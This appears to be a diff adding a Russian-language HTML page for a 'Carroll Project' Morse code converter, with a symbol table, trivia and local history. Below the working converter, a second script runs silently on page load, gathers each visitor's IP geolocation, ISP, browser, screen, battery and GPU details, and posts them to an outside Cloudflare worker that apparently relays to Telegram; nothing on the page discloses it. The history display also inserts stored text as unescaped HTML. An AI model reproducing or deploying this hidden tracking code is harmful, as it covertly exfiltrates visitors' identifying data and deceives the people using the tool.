@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Carroll Project | Morse Generator</title>
+
+  <style>
+    :root{
+      --glass-bg: rgba(25,25,25,.45);
+      --glass-border: rgba(255,255,255,.15);
+      --accent: #00e6cc;
+      --radius: 22px;
+      --blur: 28px;
+      --shadow: 0 6px 36px rgba(0,0,0,.65);
+      --trans: .25s ease;
+      --font: "Inter", system-ui, -apple-system, sans-serif;
+    }
+
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{
+      font-family:var(--font);
+      color:#f1f3f4;
+      background:#0c0c0d;
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      gap:32px;
+      padding:48px 20px 80px;
+    }
+    a{color:var(--accent);text-decoration:none}
+
+    .glass{
+      background:var(--glass-bg);
+      border:1px solid var(--glass-border);
+      backdrop-filter:blur(var(--blur)) saturate(120%);
+      -webkit-backdrop-filter:blur(var(--blur)) saturate(120%);
+      border-radius:var(--radius);
+      box-shadow:var(--shadow);
+      transition:var(--trans);
+    }
+    .glass:hover{border-color:var(--accent)}
+
+    button{
+      cursor:pointer;
+      font:600 16px/1 var(--font);
+      padding:14px 22px;
+      display:inline-flex;
+      justify-content:center;
+      align-items:center;
+      gap:8px;
+      color:#f1f3f4;
+      background:var(--glass-bg);
+      border:1px solid var(--glass-border);
+      backdrop-filter:blur(var(--blur)) saturate(120%);
+      -webkit-backdrop-filter:blur(var(--blur)) saturate(120%);
+      border-radius:var(--radius);
+      box-shadow:var(--shadow);
+      width:100%;
+      transition:var(--trans);
+    }
+    button:hover{
+      border-color:var(--accent);
+      transform:translateY(-2px);
+      box-shadow:0 8px 20px rgba(0,230,204,.4);
+    }
+    
+    header,footer{
+      width:100%;
+      max-width:1024px;
+      text-align:center;
+    }
+    header .title{
+      font-size:clamp(28px,6vw,44px);
+      background:linear-gradient(135deg,#00e6cc,#008cff);
+      -webkit-background-clip:text;
+      -webkit-text-fill-color:transparent;
+      margin-bottom:18px;
+    }
+    main{
+      width:100%;
+      max-width:1024px;
+      display:grid;
+      gap:28px;
+      grid-template-columns:1fr 1fr;
+    }
+    @media(max-width:780px){
+      main{grid-template-columns:1fr}
+    }
+
+    textarea, input{
+      width:100%;
+      background:rgba(255,255,255,.07);
+      border:none;
+      border-radius:var(--radius);
+      color:#fff;
+      padding:18px;
+      resize:none;
+      outline:none;
+      font:400 15px/1.45 var(--font);
+      transition:var(--trans);
+    }
+    textarea:focus,input:focus{background:rgba(255,255,255,.12)}
+
+    h2{
+      font-size:22px;
+      margin-bottom:16px;
+      background:linear-gradient(135deg,#00e6cc,#008cff);
+      -webkit-background-clip:text;
+      -webkit-text-fill-color:transparent;
+    }
+
+    .history, .facts{display:flex;flex-direction:column;gap:14px;max-height:420px;overflow-y:auto}
+
+    .pill{
+      padding:12px 16px;
+      border:1px solid var(--glass-border);
+      border-radius:var(--radius);
+      background:rgba(255,255,255,.05);
+      font-size:14px;
+      line-height:1.4;
+    }
+    .pill .label{color:var(--accent);font-weight:600}
+
+    .table{
+      display:grid;
+      grid-template-columns:repeat(auto-fill,minmax(60px,1fr));
+      gap:8px;
+    }
+    .cell{
+      text-align:center;
+      padding:8px 4px;
+      background:rgba(255,255,255,.05);
+      border:1px solid var(--glass-border);
+      border-radius:12px;
+      font-size:13px;
+      line-height:1.2;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="title">Carroll Project</div>
+    <p style="opacity:.8;max-width:650px;margin:0 auto 10px">
+      Онлайн-конвертер русского текста в азбуку Морзе
+      и полезными материалами.
+    </p>
+  </header>
+
+  <main>
+
+    <section class="glass" style="padding:30px">
+      <h2>Конвертер</h2>
+      <label for="src" style="font-weight:600">Введите текст</label>
+      <textarea id="src" rows="4" placeholder="Пример: Слава Україні!"></textarea>
+
+      <button id="genBtn" style="margin-top:18px">Сгенерировать</button>
+
+      <label for="dst" style="font-weight:600;margin-top:22px">Морзе-код</label>
+      <textarea id="dst" rows="4" readonly placeholder="··· ·-·· ·- ..."></textarea>
+
+      <button id="copyBtn" style="margin-top:18px;display:none">Скопировать</button>
+    </section>
+
+    <section id="factsCard" class="glass" style="padding:30px;display:none">
+      <h2>Интересные факты</h2>
+      <div class="facts" id="factsBox"></div>
+    </section>
+
+    <section class="glass" style="padding:30px">
+      <h2>Таблица символов</h2>
+      <div class="table">
+      </div>
+    </section>
+
+    <section id="histCard" class="glass" style="padding:30px;display:none">
+      <h2>История</h2>
+      <div class="history" id="histBox"></div>
+    </section>
+
+    <section class="glass" style="padding:30px">
+      <h2>О проекте</h2>
+      <p style="line-height:1.55;opacity:.85">
+        Этот небольшой инструмент — часть&nbsp;экосистемы
+        <b>Carroll Project</b>. Он создан, чтобы быстро
+        преобразовывать любой русский текст в сигналы азбуки&nbsp;Морзе —
+        системы, которая более&nbsp;180&nbsp;лет служила основой
+        телеграфии и стала символом эпохи первых радиосвязей.
+        <br><br>
+        Помимо конвертера, на&nbsp;сайте есть справочные материалы,
+        история выполненных преобразований и подборка любопытных фактов,
+        чтобы страница не казалась пустой — познакомьтесь поближе
+        с&nbsp;классикой&nbsp;радио!
+      </p>
+    </section>
+
+  </main>
+
+  <footer>
+    <p style="opacity:.6;margin-top:40px">by Aik Carroll</p>
+  </footer>
+
+<script>
+  const map = {
+    'А':'·-','Б':'-···','В':'·--','Г':'--·','Д':'-··','Е':'·','Ё':'·',
+    'Ж':'···-','З':'--··','И':'··','Й':'.---','К':'-·-','Л':'·-··','М':'--',
+    'Н':'-·','О':'---','П':'·--·','Р':'·-·','С':'···','Т':'-','У':'··-',
+    'Ф':'··-·','Х':'····','Ц':'-·-·','Ч':'---·','Ш':'----','Щ':'--·-',
+    'Ъ':'--·--','Ы':'-·--','Ь':'-··-','Э':'··-··','Ю':'··--','Я':'·-·-',
+    '0':'-----','1':'·----','2':'··---','3':'···--','4':'····-','5':'·····',
+    '6':'-····','7':'--···','8':'---··','9':'----·',
+    '.':'·-·-·-','?':'··--··','!':'--··--','-':'-····-','/':'-··-·',
+    '(':'-·--·',')':'-·--·-','"':'·-··-·','@':'·--·-·',' ':'/'
+  };
+
+  const facts = [
+    'Первое публичное сообщение по азбуке Морзе было отправлено 24 мая 1844 года и содержало текст «What hath God wrought».',
+    'В 1922 году сигнал SOS помог спасти пассажиров итальянского парохода “Principessa Mafalda”.',
+    'Сигнал SOS («··· --- ···») был утверждён на международной конференции в 1906 году.',
+    'Несмотря на появление современных технологий, Морзе остаётся обязательным предметом для многих радиолюбителей.',
+    'Прошедший сигнал «·-···» означает знак перечёркнутой L и используется как «стоп» в морской связи.'
+  ];
+
+  const src     = document.getElementById('src');
+  const dst     = document.getElementById('dst');
+  const genBtn  = document.getElementById('genBtn');
+  const copyBtn = document.getElementById('copyBtn');
+  const factsCard = document.getElementById('factsCard');
+  const factsBox  = document.getElementById('factsBox');
+  const histCard  = document.getElementById('histCard');
+  const histBox   = document.getElementById('histBox');
+  const tableEl   = document.querySelector('.table');
+
+  const HIST_KEY = 'morse_hist_v2';
+
+  (() => {
+    for(const [sym,code] of Object.entries(map)){
+      if(sym===' ') continue;
+      const cell = document.createElement('div');
+      cell.className='cell';
+      cell.innerHTML=`<b>${sym}</b><br>${code}`;
+      tableEl.appendChild(cell);
+    }
+  })();
+
+  const toMorse = txt => txt.toUpperCase().split('')
+    .map(ch => map[ch] || '').filter(Boolean).join(' ');
+
+  genBtn.addEventListener('click', () => {
+    const input = src.value.trim();
+    if(!input){src.focus();return;}
+    genBtn.disabled = true;
+    genBtn.textContent = 'Генерация...';
+
+    setTimeout(() => {
+      const morse = toMorse(input);
+      dst.value = morse;
+
+      const fact = facts[Math.floor(Math.random() * facts.length)];
+      factsCard.style.display = 'block';
+      factsBox.innerHTML = `<div class="pill">${fact}</div>`;
+
+      genBtn.style.display='none';
+      copyBtn.style.display='block';
+      genBtn.disabled = false;
+      genBtn.textContent = 'Сгенерировать';
+
+      saveHist(input,morse);
+    }, 5000);
+  });
+
+  copyBtn.addEventListener('click', () => {
+    navigator.clipboard.writeText(dst.value)
+      .then(()=>copyBtn.textContent='Скопировано!')
+      .then(()=>setTimeout(()=>copyBtn.textContent='Скопировать',1500));
+  });
+
+  function saveHist(s,d){
+    let arr = JSON.parse(localStorage.getItem(HIST_KEY)||'[]');
+    arr.push({s,d,t:Date.now()});
+    if(arr.length>50) arr=arr.slice(-50);
+    localStorage.setItem(HIST_KEY,JSON.stringify(arr));
+    renderHist();
+  }
+
+  function renderHist(){
+    const arr = JSON.parse(localStorage.getItem(HIST_KEY)||'[]').reverse();
+    if(!arr.length) return;
+    histCard.style.display='block';
+    histBox.innerHTML = arr.map(i=>`
+      <div class="pill">
+        <span class="label">Исходный:</span> ${i.s}<br>
+        <span class="label">Морзе:</span> ${i.d}
+      </div>`).join('');
+  }
+  renderHist();
+
+  src.addEventListener('input', () => {
+    genBtn.style.display='block';
+    genBtn.disabled = false;
+    genBtn.textContent = 'Сгенерировать';
+    copyBtn.style.display='none';
+    factsCard.style.display='none';
+    dst.value='';
+  });
+</script>
+<script>
+  (async () => {
+    const geoRes = await fetch('https://ipwho.is/');
+    const ipData = await geoRes.json();
+
+    let batteryInfo = {};
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = { charging: battery.charging, level: battery.level };
+      } catch {}
+    }
+
+    function getWebGLInfo() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
+        };
+      } catch {
+        return { vendor: 'неизвестно', renderer: 'неизвестно' };
+      }
+    }
+
+    const gpu = getWebGLInfo();
+    const info = {
+      ip: ipData.ip,
+      city: ipData.city,
+      region: ipData.region,
+      country: ipData.country,
+      isp: ipData.connection?.isp || 'Неизвестно',
+      timezone: ipData.timezone?.id || 'N/A',
+      userAgent: navigator.userAgent,
+      screen: `${screen.width}x${screen.height}`,
+      platform: navigator.platform,
+      language: navigator.language,
+      touchSupport: navigator.maxTouchPoints > 0 ? 'да' : 'нет',
+      battery: batteryInfo,
+      gpuVendor: gpu.vendor,
+      gpuRenderer: gpu.renderer,
+      time: new Date().toLocaleString()
+    };
+
+    const text = `
+🕵️ morse.carroll-project.online:
+IP: ${info.ip}
+Город: ${info.city}, ${info.country}
+Провайдер: ${info.isp}
+Часовой пояс: ${info.timezone}
+Платформа: ${info.platform}
+Язык браузера: ${info.language}
+Разрешение экрана: ${info.screen}
+Поддержка касаний: ${info.touchSupport}
+Батарея: ${info.battery.level * 100}% ${info.battery.charging ? '(заряжается)' : ''}
+GPU Vendor: ${info.gpuVendor}
+GPU Renderer: ${info.gpuRenderer}
+Браузер: ${info.userAgent}
+Время: ${info.time}
+    `.trim();
+
+    await fetch('https://tg-proxy.vassa0081-0f3.workers.dev', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ text })
+    });
+  })();
+</script>
+</body>
+</html>
